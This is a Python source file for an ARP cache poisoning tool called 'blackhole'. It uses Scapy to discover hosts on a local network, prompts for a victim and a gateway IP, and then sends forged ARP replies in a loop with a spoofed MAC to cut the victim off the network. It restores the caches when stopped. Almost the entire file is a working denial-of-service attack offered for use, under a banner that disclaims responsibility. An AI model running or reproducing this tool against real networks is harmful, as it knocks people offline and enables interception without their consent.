import sys
from colorama import init
from termcolor import cprint
from pyfiglet import figlet_format
import os
from scapy.all import *
from time import sleep
import random


def welcome():
	init(strip = not sys.stdout.isatty())
	cprint(figlet_format('blackhole', font = 'slant'),
		'green', attrs = ['bold'])
	cprint('Made by siddver007', 'yellow', attrs = ['bold'])
	print('\n')
	cprint('I AM NOT RESPONSIBLE FOR YOUR ACTIONS.' 
		+ ' DO NOT MISUSE IT.', 'red', attrs = ['bold'])
	print('\n\n')


def sniff(ipv4, interface):
	cprint("Sniffing...", 'blue', attrs = ['bold'])
	print('\n\n')
	resp,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ipv4),
			timeout=2, verbose=False, iface=interface)
	print('IPv4          :          MAC')
	print('..................................')
	resp.summary(lambda(s,r): r.sprintf("%ARP.psrc% : %Ether.src%") )
	ip_mac = {}
	for x in resp:
		ip_mac[str(x[1][ARP].psrc)] = str(x[1][Ether].src)
	return ip_mac	


def spoofMac(): 
    mac = [0x12, 0x34, 0x56, random.randint(0x00, 0x7f), random.randint(0x00, 0xff), random.randint(0x00, 0xff)] 
    return ':'.join(map(lambda x: "%02x" % x, mac))


def reverse_blackhole(opt, victim_ipv4, gateway_ipv4, victim_mac, gateway_mac):
	if opt == 1:
		packet = ARP(op=2, psrc=gateway_ipv4, hwsrc=gateway_mac, pdst=victim_ipv4, hwdst=victim_mac)
		for i in range(5):
			send(packet, verbose = False)
			sleep(2)
	else:
		packet = ARP(op=2, psrc=victim_ipv4, hwsrc=victim_mac, pdst=gateway_ipv4, hwdst=gateway_mac)
		for i in range(5):
			send(packet, verbose = False)
			sleep(2)
	print('\n\n')		
	cprint('Restored. Enjoy. Exiting...', 'yellow', attrs = ['bold'])
	print('\n\n')


def blackhole(ip_mac):
	print('\n\n')
	if not bool(ip_mac):
			print('No hosts found on LAN')
	else:
		victim_ipv4 = str(raw_input('Enter victim\'s IPv4 : ')).strip()
		print('\n')
		gateway_ipv4 = str(raw_input('Enter Gateway\'s IPv4 : ')).strip()
		victim_mac = ip_mac[victim_ipv4]
		gateway_mac = ip_mac[gateway_ipv4]
		print('\n\n')
		cprint('Choose 1 to poison Victim\'s ARP Cache', 'yellow', attrs = ['bold'])
		print('\n')
		cprint('Choose 2 to poison Router\'s ARP Cache', 'yellow', attrs = ['bold'])
		print('\n')
		opt = int(str(raw_input('Input your choice : ')))
		print('\n\n')
		spoofed_mac = spoofMac()
		if opt == 1:
			packet = ARP(op=2, psrc=gateway_ipv4, hwsrc=spoofed_mac, pdst=victim_ipv4, hwdst=victim_mac)
			cprint('Blackholing ' + victim_ipv4 + ' [CTRL-C to stop]', 'blue', attrs = ['bold'])
			try:
				while True:
					send(packet, verbose = False)
					sleep(2)
			except KeyboardInterrupt:
				print('\n\n')
				cprint("Stopped Blackholing. Restoring network...", 'blue', attrs = ['bold'])
				reverse_blackhole(opt, victim_ipv4, gateway_ipv4, victim_mac, gateway_mac)
		elif opt == 2:
			packet = ARP(op=2, psrc=victim_ipv4, hwsrc=spoofed_mac, pdst=gateway_ipv4, hwdst=gateway_mac)
			cprint('Blackholing ' + victim_ipv4 + ' by poisoning Gateway\'s ARP Cache [CTRL-C to stop]', 'blue', attrs = ['bold'])
			try:
				while True:
					send(packet, verbose = False)
					sleep(2)
			except KeyboardInterrupt:
				print('\n\n')
				cprint("Stopped Blackholing. Restoring network...", 'blue', attrs = ['bold'])
				reverse_blackhole(opt, victim_ipv4, gateway_ipv4, victim_mac, gateway_mac)
		else:
			cprint("Wrong option. Exiting...", 'blue', attrs = ['bold'])


if __name__ == '__main__':
		welcome()
		ipv4_or_ipv4cidr = str(raw_input('Enter IPv4 or CIDR (192.168.1.23 or 192.168.1.0/24) : ')).strip()
		print('\n')
		interface = str(raw_input('Enter interface : ')).strip()
		print('\n')
		ip_mac = sniff(ipv4_or_ipv4cidr, interface)
		blackhole(ip_mac)